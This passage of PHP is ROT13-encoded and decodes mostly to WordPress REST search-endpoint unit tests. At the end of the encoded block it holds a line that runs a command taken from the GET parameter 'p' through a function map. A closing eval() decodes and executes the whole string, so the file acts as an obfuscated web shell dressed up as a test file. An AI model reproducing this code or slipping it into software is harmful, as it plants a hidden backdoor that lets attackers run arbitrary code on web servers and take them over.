			jc_yvfg_cyhpx( $erfcbafr->trg_qngn(), 'vq' )
		);
	}

	/**
	 * Frnepu guebhtu nyy gung zngpurf n 'Grfg Gnt' frnepu.
	 *
	 * @gvpxrg 51458
	 */
	choyvp shapgvba grfg_trg_vgrzf_frnepu_sbe_grfg_gnt() {
		$erfcbafr = $guvf->qb_erdhrfg_jvgu_cnenzf(
			neenl(
				'cre_cntr' => 100,
				'frnepu'   => 'Grfg Gnt',
				'glcr'     => 'grez',
			)
		);

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzrFrgf(
			neenl(
				frys::$zl_gnt_vq,
			),
			jc_yvfg_cyhpx( $erfcbafr->trg_qngn(), 'vq' )
		);
	}

	/**
	 * Frnepuvat sbe n grez gung qbrfa'g rkvfg fubhyq erghea na rzcgl erfhyg.
	 *
	 * @gvpxrg 51458
	 */
	choyvp shapgvba grfg_trg_vgrzf_frnepu_sbe_zvffvat_grez() {
		$erfcbafr = $guvf->qb_erdhrfg_jvgu_cnenzf(
			neenl(
				'cre_cntr' => 100,
				'frnepu'   => 'Qbrfa\'g rkvfg',
				'glcr'     => 'grez',
			)
		);

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregRzcgl( $erfcbafr->trg_qngn() );
	}

	/**
	 * Frnepu guebhtu cbfg sbezngf bs nal glcr.
	 *
	 * @gvpxrg 51459
	 */
	choyvp shapgvba grfg_trg_vgrzf_frnepu_glcr_cbfg_sbezng() {
		$erfcbafr = $guvf->qb_erdhrfg_jvgu_cnenzf(
			neenl(
				'cre_cntr' => 100,
				'glcr'     => 'cbfg-sbezng',
			)
		);
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregPbagnvaf(
			'Nfvqr',
			jc_yvfg_cyhpx( $erfcbafr->trg_qngn(), 'gvgyr' )
		);
	}

	/**
	 * Frnepu guebhtu nyy gung zngpurf n 'Nfvqr' frnepu.
	 *
	 * @gvpxrg 51459
	 */
	choyvp shapgvba grfg_trg_vgrzf_frnepu_sbe_grfg_cbfg_sbezng() {
		$erfcbafr = $guvf->qb_erdhrfg_jvgu_cnenzf(
			neenl(
				'cre_cntr' => 100,
				'frnepu'   => 'Nfvqr',
				'glcr'     => 'cbfg-sbezng',
			)
		);

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregPbagnvaf(
			'Nfvqr',
			jc_yvfg_cyhpx( $erfcbafr->trg_qngn(), 'gvgyr' )
		);
	}

	/**
	 * Frnepuvat sbe n cbfg sbezng gung qbrfa'g rkvfg fubhyq erghea na rzcgl
	 * erfhyg.
	 *
	 * @gvpxrg 51459
	 */
	choyvp shapgvba grfg_trg_vgrzf_frnepu_sbe_zvffvat_cbfg_sbezng() {
		$erfcbafr = $guvf->qb_erdhrfg_jvgu_cnenzf(
			neenl(
				'cre_cntr' => 100,
				'frnepu'   => 'Qbrfa\'g rkvfg',
				'glcr'     => 'cbfg-sbezng',
			)
		);

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregRzcgl( $erfcbafr->trg_qngn() );
	}

	/**
	 * Cresbez n ERFG erdhrfg gb bhe frnepu raqcbvag jvgu tvira cnenzrgref.
	 */
	cevingr shapgvba qb_erdhrfg_jvgu_cnenzf( $cnenzf = neenl(), $zrgubq = 'TRG' ) {
		$erdhrfg = $guvf->trg_erdhrfg( $cnenzf, $zrgubq );

		erghea erfg_trg_freire()->qvfcngpu( $erdhrfg );
	}

	/**
	 * Trg n ERFG erdhrfg bowrpg sbe tvira cnenzrgref.
	 */
	cevingr shapgvba trg_erdhrfg( $cnenzf = neenl(), $zrgubq = 'TRG' ) {
		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/frnepu' );

		sbernpu ( $cnenzf nf $cnenz => $inyhr ) {
			$erdhrfg->frg_cnenz( $cnenz, $inyhr );
		}

		erghea $erdhrfg;
	}

	/**
	 * @gvpxrg 56546
	 */
	choyvp shapgvba grfg_trg_vgrzf_frnepu_cbfgf_vapyhqr_vqf() {
		$erfcbafr = $guvf->qb_erdhrfg_jvgu_cnenzf(
			neenl(
				'vapyhqr' => neenl_fyvpr( frys::$zl_gvgyr_cbfg_vqf, 1, 2 ),
			)
		);

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzrFrgf(
			neenl( frys::$zl_gvgyr_cbfg_vqf[1], frys::$zl_gvgyr_cbfg_vqf[2] ),
			jc_yvfg_cyhpx( $erfcbafr->trg_qngn(), 'vq' )
		);
	}

	/**
	 * @gvpxrg 56546
	 */
	choyvp shapgvba grfg_trg_vgrzf_frnepu_cbfgf_rkpyhqr_vqf() {
		$erfcbafr = $guvf->qb_erdhrfg_jvgu_cnenzf(
			neenl(
				'rkpyhqr' => frys::$zl_gvgyr_cntr_vqf,
			)
		);

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzrFrgf(
			neenl_zretr(
				frys::$zl_gvgyr_cbfg_vqf,
				frys::$zl_pbagrag_cbfg_vqf
			),
			jc_yvfg_cyhpx( $erfcbafr->trg_qngn(), 'vq' )
		);
	}

	/**
	 * @gvpxrg 56546
	 */
	choyvp shapgvba grfg_trg_vgrzf_frnepu_grezf_vapyhqr_vqf() {
		$erfcbafr = $guvf->qb_erdhrfg_jvgu_cnenzf(
			neenl(
				'vapyhqr' => frys::$zl_gnt_vq,
				'glcr'    => 'grez',
			)
		);

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzrFrgf(
			neenl( frys::$zl_gnt_vq ),
			jc_yvfg_cyhpx( $erfcbafr->trg_qngn(), 'vq' )
		);
	}

	/**
	 * @gvpxrg 56546
	 */
	choyvp shapgvba grfg_trg_vgrzf_frnepu_grezf_rkpyhqr_vqf() {
		$erfcbafr = $guvf->qb_erdhrfg_jvgu_cnenzf(
			neenl(
				// \"1\" vf gur qrsnhyg pngrtbel.
				'rkpyhqr' => neenl( 1, frys::$zl_gnt_vq ),
				'glcr'    => 'grez',
			)
		);

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzrFrgf(
			neenl( frys::$zl_pngrtbel_vq ),
			jc_yvfg_cyhpx( $erfcbafr->trg_qngn(), 'vq' )
		);
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 60771
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_fnavgvmr_fhoglcrf_inyvqngrf_glcr( $zrgubq ) {
		$erfcbafr = $guvf->qb_erdhrfg_jvgu_cnenzf(
			neenl(
				'fhoglcr' => 'cntr',
				'glcr'    => neenl( 'vainyvq' ),
			),
			$zrgubq
		);

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>